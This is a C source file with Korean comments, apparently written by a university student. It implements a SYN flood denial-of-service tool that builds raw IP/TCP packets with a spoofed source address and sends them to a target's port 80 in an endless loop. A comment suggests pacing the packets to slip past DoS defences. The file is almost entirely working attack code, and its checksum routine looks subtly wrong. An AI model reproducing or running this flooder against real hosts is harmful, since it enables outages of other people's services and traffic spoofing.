// Made by Kim-DongYoung (Undergraduate Student of Hallym University)

#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h> // IP헤더를 정의하기 위함
#include <netinet/tcp.h> // TCP 헤더를 정의하기 위함
#include <stdlib.h>
#include <stdio.h>
#include <string.h> // memset
#include <netinet/in.h> // inet_addr
#include <arpa/inet.h> // inet_addr


/* TCP 패킷의 체크섬 계산을 하기 위해 필요한, 가짜 IP패킷을 제작 */
struct pseudohdr{
	unsigned int source_address; // 발신자의 IP
	unsigned int dest_address; // 수신자의 IP
	unsigned char placeholder; // 사용하지 않음
	unsigned char protocol; // 프로토콜 설정 공간
	unsigned short tcp_length; // TCP 헤더의 길이
	
	struct tcphdr tcp; // TCP 헤더, TCP 헤더 만큼의 공간을 차지함
};

// 참고자료: https://enderbridge.tistory.com/93
/* IP, TCP의 패킷 헤더의 체크섬 계산 */
unsigned short csum(unsigned short *buf, int len) {
    // 세그먼트 내용을 연속된 16비트 정수로 만듦
    unsigned long sum;
    for(sum = 0; len>0; len--){
        sum += *buf++;
    }
    // 상위 16비트와 하위 16비트를 더함
    sum = (sum << 16) + (sum &0xffff);
    // Carry bit를 더함
    sum += (sum >> 16);
    // 1의 보수로 만들어 반환
    return (unsigned short)(~sum);
}

// 참고자료: https://tmdgus.tistory.com/124
// 참고자료: http://research.hackerschool.org/study/SS_1.htm
int synflooding(char *csaddr, char *cdaddr){
    /* 함수 구동에 필요한 변수 선언 */
    struct pseudohdr pseudo_header; // 가짜 헤더(TCP헤더 검증용)
    struct iphdr * iph; // IP 헤더
    struct tcphdr * tcph; // TCP 헤더
    struct sockaddr_in address; // 목적지 주소정보 저장
    char payload[4096]; // 헤더와 데이터가 담기는 변수

    char send_addr[32]="", dest_addr[32] = ""; // 보내는 주소와 목적지 주소변수
    strcpy(send_addr, csaddr);
    strcpy(dest_addr, cdaddr);
    int socket_des = 0; // 소켓 디스크립터를 저장하는 변수
    
    /* 소켓 생성 변수 */
    if ((socket_des = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
        perror("Socket Error!");
    }

    /* 목적지 주소 정보를 저장한다. */
    memset(payload, 0, 4096);
    address.sin_family = AF_INET; // IPv4 사용
    address.sin_port = htons( 80 ); // 목적지 포트: 80
    address.sin_addr.s_addr = inet_addr(dest_addr); // 목적지 주소: dest_addr에 저장된 값
    
    /* IP 헤더 정보를 채운다. */
    iph = (struct iphdr*)payload; // ip헤더를 저장할 공간 할당
    memset((char*)iph, 0, sizeof(iph)); // 메모리를 0으로 초기화
    iph->ihl = 5; // 헤더 길이
	iph->version = 4; // IP버전
	iph->tos = 0; // 서비스 타입
	iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr); // 전체 길이
	iph->id = htons(54321);	// Identification
	iph->frag_off = 0; // Fragment 오프셋 필드
	iph->ttl = 255; // Time to Live
	iph->protocol = IPPROTO_TCP; // 프로토콜
	iph->check = 0;		// 체크섬
	iph->saddr = inet_addr(send_addr);	// 보내는 주소(Source Address Spoofing)
	iph->daddr = inet_addr(dest_addr); // 받는 주소
    /* IP헤더의 체크섬을 구한다. */
	iph->check = csum ((unsigned short *) payload, sizeof(struct ip));

    /* TODO: TCP 헤더 정보를 채운다. */
    tcph = (struct tcphdr*)(payload + sizeof(struct iphdr)); // TCP 헤더를 저장할 공간 할당
    memset((char*)tcph, 0, sizeof(tcph)); // 메모리를 0으로 초기화
    tcph->source = htons(1234); // 보내는 주소,임의의 값으로 지정
    tcph->dest = htons(80); // 목적지 포트주소
    tcph->seq = 0; // TCP 패킷 순서
    tcph->ack_seq = 0; // TCP ACK 패킷의 순서
    tcph->doff = 5; // offset의 값 지정
    tcph->fin=0; // FIN Flag
	tcph->syn=1; // SYN Flag
	tcph->rst=0; // RST Flag
	tcph->psh=0; // PSH Flag
	tcph->ack=0; // ACK Flag
	tcph->urg=0; // URG Flag
    tcph->window = htons(5840); // 윈도우 사이즈

    /* 체크섬 계산을 위해, TCP크기를 맞출 가짜 ip 패킷 헤더를 만든다. */
    pseudo_header.source_address = inet_addr(send_addr); // 가짜 헤더의 시작주소
    pseudo_header.dest_address = address.sin_addr.s_addr; // 가짜 헤더의 목적지주소
    pseudo_header.placeholder = 0; // 빈 공간
    pseudo_header.protocol = IPPROTO_TCP; // 프로토콜
    pseudo_header.tcp_length = htons(20); // TCP 길이. 일반적으로 TCP와 IP는 20의 길이를 가진다.

    /* TCP헤더의 체크섬을 구한다. */
    memcpy(&pseudo_header.tcp , tcph , sizeof (struct tcphdr)); // 
    tcph->check = csum((unsigned short *)&pseudo_header, sizeof(struct pseudohdr)); // 체크섬을 구한다

    /* setsockopt()를 이용해서 커널에 헤더값을 변경하지 말 것을 알려준다. */
    int optval = 1;
    if(setsockopt(socket_des, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0)
    {
        perror("Setsockopt() Error!");
	} 

    /* TCP 헤더 패킷을 전송한다. */
    while (1)
	{
		if (sendto (socket_des,		// 소켓디스크립터
					payload,	// 헤더와 데이터를 포함한 변수(버퍼)
					iph->tot_len,	// 패킷 전체 길이
					0,		// 라우팅 Flag로, 보통 0으로 설정한다.
					(struct sockaddr *) &address,	// 소켓 주소정보
					sizeof (address)) < 0)		// 소켓 주소정보의 크기
		{
            perror("Sendto() Error!");
		}
		else
		{
			printf ("Packet Send \n");
		}
        // sleep(1) // 최근 방어장비는 DoS 공격을 방어하는 기능이 있어, 시간차 공격을 통해 자원을 고갈 시킬 수 있다.
	}


}
